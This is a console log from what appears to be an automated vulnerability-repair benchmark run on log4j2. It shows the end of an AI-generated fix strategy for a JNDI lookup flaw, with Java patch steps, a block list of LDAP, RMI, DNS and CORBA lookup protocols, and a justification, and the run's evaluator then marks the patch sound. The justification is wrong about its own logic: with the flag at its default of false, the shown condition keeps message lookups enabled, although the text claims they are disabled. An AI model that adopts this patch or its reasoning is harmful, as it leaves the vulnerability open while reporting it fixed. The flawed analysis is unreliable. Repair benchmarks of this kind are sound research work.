[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Step [0m[1;36m1.3[0m[39m**: Modify the `[0m[1;35mlookup[0m[1;39m([0m[39mLogEvent event, String key[0m[1;39m)[0m[39m` method to add [0m        [2m                [0m
[2;36m                    [0m         [39mprotocol validation:[0m                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m@Override[0m                                                                           [2m                [0m
[2;36m                    [0m         [39mpublic String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [39m    if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                             [2m                [0m
[2;36m                    [0m         [39m        return null;[0m                                                                [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m    [0m[35m/[0m[35m/[0m[39m Add protocol validation before performing lookup[0m                             [2m                [0m
[2;36m                    [0m         [39m    if [0m[1;39m([0m[39m![0m[1;35misAllowedJndiProtocol[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                              [2m                [0m
[2;36m                    [0m         [39m        [0m[1;35mLOGGER.warn[0m[1;39m([0m[32m"Rejected JNDI lookup with potentially unsafe protocol: [0m[32m{[0m[32m}[0m[32m"[0m[39m, [0m   [2m                [0m
[2;36m                    [0m         [39mkey[0m[1;39m)[0m[39m;[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m        return null;[0m                                                                [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m    try [0m[1;39m{[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m        InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [39m        return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [39m        return null;[0m                                                                [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;39m}[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Step [0m[1;36m1.4[0m[39m**: Keep the setter and getter methods unchanged for backward [0m            [2m                [0m
[2;36m                    [0m         [39mcompatibility [0m[1;39m([0m[39mthey remain at lines [0m[1;36m81[0m[39m-[0m[1;36m87[0m[1;39m)[0m[39m.[0m                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m2[0m[39m. **Fix MessagePatternConverter.java** [0m[1;39m([0m[39mSecondary Defense[0m[1;39m)[0m                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Step [0m[1;36m2.1[0m[39m**: Add the import and security flag at the top of the class [0m[1;39m([0m[39mafter the [0m  [2m                [0m
[2;36m                    [0m         [39mexisting imports[0m[1;39m)[0m[39m:[0m                                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [39mimport org.apache.logging.log4j.util.PropertiesUtil;[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m In the class body, add the flag after line [0m[1;36m30[0m                                    [2m                [0m
[2;36m                    [0m         [39mprivate static final boolean FORMAT_MESSAGES_NO_LOOKUPS = [0m                          [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m[1;35m.getBooleanProperty[0m[1;39m([0m[32m"log4j2.formatMsgNoLookups"[0m[39m, [0m [2m                [0m
[2;36m                    [0m         [39mfalse[0m[1;39m)[0m[39m;[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Step [0m[1;36m2.2[0m[39m**: Modify the condition in the `format` method at line [0m[1;36m71[0m[39m to check the [0m  [2m                [0m
[2;36m                    [0m         [39msecurity flag:[0m                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [39mif [0m[1;39m([0m[39mresult != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                               [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && !FORMAT_MESSAGES_NO_LOOKUPS && [0m             [2m                [0m
[2;36m                    [0m         [1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m                                                             [2m                [0m
[2;36m                    [0m         [39m        [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m                         [2m                [0m
[2;36m                    [0m         [1;39m}[0m[39m else [0m[1;39m{[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35mtoAppendTo.append[0m[1;39m([0m[32m"null"[0m[1;39m)[0m[39m;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;39m}[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Important**: Do NOT change the @Plugin name from [0m[32m"MessagePatternConverter"[0m[39m to [0m    [2m                [0m
[2;36m                    [0m         [32m"m"[0m[39m. The plugin name must remain unchanged.[0m                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m3[0m[39m. **Update Constants.java**[0m                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mAdd the new configuration property name constants after line [0m[1;36m41[0m[39m:[0m                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[39m**[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m * System property to disable JNDI lookups for security.[0m                            [2m                [0m
[2;36m                    [0m         [39m *[0m[35m/[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39mpublic static final String LOG4J_ENABLE_JNDI_LOOKUP = [0m[32m"log4j2.enableJndiLookup"[0m[39m;[0m    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[39m**[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m * System property to disable message pattern lookups for security.[0m                 [2m                [0m
[2;36m                    [0m         [39m *[0m[35m/[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39mpublic static final String LOG4J_FORMAT_MSG_NO_LOOKUPS = [0m                           [2m                [0m
[2;36m                    [0m         [32m"log4j2.formatMsgNoLookups"[0m[39m;[0m                                                        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Rationale and Justification[0m                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Why This Approach is Optimal[0m                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Resolves Compilation Error**: By keeping `ENABLE_JNDI` as non-final, the [0m      [2m                [0m
[2;36m                    [0m         [39mexisting setter method at line [0m[1;36m81[0m[39m-[0m[1;36m83[0m[39m continues to work without compilation errors.[0m  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Secure by Default**: Both security flags default to `false`, which means:[0m      [2m                [0m
[2;36m                    [0m         [39m   - JNDI lookups are disabled by default [0m[1;39m([0m[39m`[0m[33menableJndiLookup[0m[39m=[0m[35mfalse[0m[39m`[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [39m   - Message pattern lookups are disabled by default [0m[1;39m([0m[39m`[0m[33mformatMsgNoLookups[0m[39m=[0m[35mfalse[0m[39m`[0m[1;39m)[0m   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Defense in Depth**: Two layers of protection:[0m                                  [2m                [0m
[2;36m                    [0m         [39m   - **Primary**: MessagePatternConverter disables all message substitution when [0m   [2m                [0m
[2;36m                    [0m         [39m`[0m[33mFORMAT_MESSAGES_NO_LOOKUPS[0m[39m=[0m[35mfalse[0m[39m`[0m                                                  [2m                [0m
[2;36m                    [0m         [39m   - **Secondary**: JndiLookup validates protocols and respects the `ENABLE_JNDI` [0m  [2m                [0m
[2;36m                    [0m         [39mflag[0m                                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Backward Compatibility**: [0m                                                     [2m                [0m
[2;36m                    [0m         [39m   - Keeps the setter/getter methods for JNDI control[0m                               [2m                [0m
[2;36m                    [0m         [39m   - Doesn't change plugin names or break plugin discovery[0m                          [2m                [0m
[2;36m                    [0m         [39m   - Allows users to opt-in to JNDI if needed by setting the property to true[0m       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Preserves Legitimate Functionality**: The protocol validation allows [0m[32m"java:"[0m[39m [0m  [2m                [0m
[2;36m                    [0m         [39mprotocol, which is used by:[0m                                                         [2m                [0m
[2;36m                    [0m         [39m   - JNDIContextSelector for container context lookups[0m                              [2m                [0m
[2;36m                    [0m         [39m   - AbstractJMSManager for JMS configuration[0m                                       [2m                [0m
[2;36m                    [0m         [39m   - Any local JNDI context lookups[0m                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### How It Addresses the Vulnerability[0m                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Blocks the Attack Vector**: When [0m[33mFORMAT_MESSAGES_NO_LOOKUPS[0m[39m=[0m[35mfalse[0m[39m [0m[1;39m([0m[39mdefault[0m[1;39m)[0m[39m, [0m  [2m                [0m
[2;36m                    [0m         [39mthe condition `config != null && !FORMAT_MESSAGES_NO_LOOKUPS && [0m                    [2m                [0m
[2;36m                    [0m         [1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m` evaluates to false, preventing any variable substitution in [0m [2m                [0m
[2;36m                    [0m         [39mlog messages.[0m                                                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Protocol Validation**: Even if JNDI is enabled, the `isAllowedJndiProtocol` [0m   [2m                [0m
[2;36m                    [0m         [39mmethod blocks:[0m                                                                      [2m                [0m
[2;36m                    [0m         [39m   - `ldap:[0m[35m/[0m[35m/[0m[39m`, `ldaps:[0m[35m/[0m[35m/[0m[39m` [0m[1;39m([0m[39mLDAP injection[0m[1;39m)[0m                                         [2m                [0m
[2;36m                    [0m         [39m   - `rmi:[0m[35m/[0m[35m/[0m[39m` [0m[1;39m([0m[39mRMI remote code execution[0m[1;39m)[0m                                           [2m                [0m
[2;36m                    [0m         [39m   - `dns:[0m[35m/[0m[35m/[0m[39m` [0m[1;39m([0m[39mDNS exfiltration[0m[1;39m)[0m                                                    [2m                [0m
[2;36m                    [0m         [39m   - `iiop:[0m[35m/[0m[35m/[0m[39m`, `corba:[0m[35m/[0m[35m/[0m[39m` [0m[1;39m([0m[39mCORBA attacks[0m[1;39m)[0m                                          [2m                [0m
[2;36m                    [0m         [39m   - Variations without [0m[32m"://"[0m[39m like [0m[32m"ldap:"[0m[39m, [0m[32m"rmi:"[0m                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Allows Safe Patterns**: [0m                                                       [2m                [0m
[2;36m                    [0m         [39m   - Local resources without protocol: [0m[32m"myResource"[0m[39m → [0m[32m"java:comp/env/myResource"[0m[39m [0m   [2m                [0m
[2;36m                    [0m         [1;39m([0m[39msafe[0m[1;39m)[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m   - Explicit java protocol: [0m[32m"java:comp/env/myResource"[0m[39m [0m[1;39m([0m[39msafe[0m[1;39m)[0m                      [2m                [0m
[2;36m                    [0m         [39m   - Blocks everything else by default[0m                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Potential Side Effects and Mitigation[0m                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Breaking Change for JNDI Users**: Applications using JNDI lookups in log [0m      [2m                [0m
[2;36m                    [0m         [39mmessages will stop working by default.[0m                                              [2m                [0m
[2;36m                    [0m         [39m   - **Mitigation**: Users can enable it by setting `log4j2.[0m[33menableJndiLookup[0m[39m=[0m[35mtrue[0m[39m` [0m [2m                [0m
[2;36m                    [0m         [39mand `log4j2.[0m[33mformatMsgNoLookups[0m[39m=[0m[35mtrue[0m[39m`, but they'll receive a security warning.[0m       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Breaking Change for Variable Substitution**: Applications using other variable[0m [2m                [0m
[2;36m                    [0m         [39msubstitutions [0m[1;39m([0m[39m$[0m[1;39m{[0m[39msys:[0m[33m...[0m[1;39m}[0m[39m, $[0m[1;39m{[0m[39menv:[0m[33m...[0m[1;39m}[0m[1;39m)[0m[39m in log messages will also stop working.[0m      [2m                [0m
[2;36m                    [0m         [39m   - **Mitigation**: Same as above - users can enable it via configuration if they [0m [2m                [0m
[2;36m                    [0m         [39mtrust their log message sources.[0m                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Test Compatibility**: The existing JndiLookupTest checks `[0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m` and [0m [2m                [0m
[2;36m                    [0m         [39mreturns early if disabled, so it should handle the new default gracefully.[0m          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Similar Solutions in Codebase[0m                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe pattern of using PropertiesUtil for configuration is consistent with:[0m           [2m                [0m
[2;36m                    [0m         [39m- Constants.LINE_SEP using `[0m[1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m[1;35m.getStringProperty[0m[1;39m([0m[33m...[0m[1;39m)[0m[39m`[0m  [2m                [0m
[2;36m                    [0m         [39m- Other lookup implementations using StatusLogger for warnings [0m[1;39m([0m[39mDateLookup, [0m        [2m                [0m
[2;36m                    [0m         [39mFileUtils[0m[1;39m)[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m- The static initialization block pattern for configuration[0m                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThis fix strategy follows established patterns in the Log4j2 codebase while [0m        [2m                [0m
[2;36m                    [0m         [39maddressing the critical security vulnerability and resolving the compilation error.[0m [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mfix_strategy[0m[1m>[0m                                                                     [2m                [0m
[2;36m                    [0m         ===Evaluation [33mEnd[0m===                                                                [2m                [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.EVALUATE -> TeamStatus.END                      ]8;id=472027;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=74742;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m3[0m, patch status: PatchStatus.SOUND[1m)[0m                                        [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Building environment                                                                 ]8;id=170681;file:///home/qqor/crete/packages/crete/framework/context_builder/services/aixcc/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=946924;file:///home/qqor/crete/packages/crete/framework/context_builder/services/aixcc/__init__.py#132\[2m132[0m]8;;\
[2;36m                    [0m         - Cache directory: [35m/tmp/[0m[95mtmp4th5q0xs[0m                                                  [2m               [0m
[2;36m                    [0m         - Max timeout: [1;36m1800[0m                                                                  [2m               [0m
[2;36m                    [0m         - Output directory:                                                                  [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/reports/prism.prism_claude_sonnet_4_5/log4j2_log4j2-delta-01_vuln_0[0m [2m               [0m
[2;36m                    [0m         [35m/[0m[95magent-output-1767720081.6223798[0m                                                     [2m               [0m
[2;36m                    [0m         - Detection toml file:                                                               [2m               [0m
[2;36m                    [0m         scripts/benchmark/afc-no-delta/log4j2_log4j2-delta-01_vuln_0.toml                    [2m               [0m
[2;36m                    [0m         - Challenge project directory: [35m/home/qqor/crete/.cache/[0m[95mofficial-afc-logging-log4j2[0m   [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m[01/06/26 17:21:23][0m[2;36m [0m[34mINFO    [0m Deleting environments directory: [35m/home/qqor/crete/.cache/environments/[0m[95mlog4j2[0m         ]8;id=824882;file:///home/qqor/crete/scripts/benchmark/__main__.py\[2m__main__.py[0m]8;;\[2m:[0m]8;id=345150;file:///home/qqor/crete/scripts/benchmark/__main__.py#300\[2m300[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Deleted work directory:                                                              ]8;id=852821;file:///home/qqor/crete/scripts/benchmark/__main__.py\[2m__main__.py[0m]8;;\[2m:[0m]8;id=86580;file:///home/qqor/crete/scripts/benchmark/__main__.py#314\[2m314[0m]8;;\
[2;36m                    [0m         [35m/home/qqor/crete/packages/python_oss_fuzz/.oss_fuzz/build/work/[0m[95mlog4j2[0m                [2m               [0m
[2;36m[01/06/26 17:21:24][0m[2;36m [0m[34mINFO    [0m Deleted out directory:                                                               ]8;id=457876;file:///home/qqor/crete/scripts/benchmark/__main__.py\[2m__main__.py[0m]8;;\[2m:[0m]8;id=349103;file:///home/qqor/crete/scripts/benchmark/__main__.py#321\[2m321[0m]8;;\
[2;36m                    [0m         [35m/home/qqor/crete/packages/python_oss_fuzz/.oss_fuzz/build/out/[0m[95mlog4j2[0m                 [2m               [0m
